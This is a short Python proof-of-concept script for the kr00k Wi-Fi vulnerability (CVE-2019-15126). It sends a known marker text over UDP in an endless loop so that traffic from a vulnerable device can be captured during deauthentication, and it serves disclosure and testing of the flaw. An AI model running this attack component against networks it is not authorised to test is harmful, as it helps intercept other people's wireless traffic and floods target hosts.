#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
r00kie-kr00kie.py: PoC of CVE-2019-15126 kr00k vulnerability
Authors: @default_pass, @cherboff, @_chipik
License: GNU GENERAL PUBLIC LICENSE Version 3
Copyright 2020, Hexway
"""
# endregion
import socket
from argparse import ArgumentParser



def send_udp(ip, port, payload, verb):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    i = 0
    while True:
        try:
            if verb:
                print(f"Send {i} packet")
                i =i+1
            sock.sendto(bytes(payload, "utf-8"), (ip, port))
        except OSError as Error:
            if verb:
                print("Got deauth...")
            pass


# region Main function
if __name__ == '__main__':
    try:
        parser: ArgumentParser = ArgumentParser(description='PoC of CVE-2019-15126 kr00k vulnerability')
        parser.add_argument('-i', '--ip', default= '8.8.8.8', help='IP address where UDP packets will be sent')
        parser.add_argument('-p', '--port', help='Port where UDP packets will be sent',
                            default=53, type=int)
        parser.add_argument('-v', '--verb', action='store_true', help='Verbose output')

        args = parser.parse_args()
        # endregion

        payload = "Yeah! It's working! I can read this text! I'm so happy!! Now I'm going to follow all these guys: @_chipik, @__bypass__, @cherboff, @_hexway !!! " * 60
        print(f"Sending payload to the UDP port {args.port} on {args.ip}\n Press Ctrl+C to exit")
        send_udp(args.ip, args.port, payload, args.verb)

    except KeyboardInterrupt:
        print('Exit')
        exit(0)

    except AssertionError as Error:
        print(Error.args[0])
        exit(1)
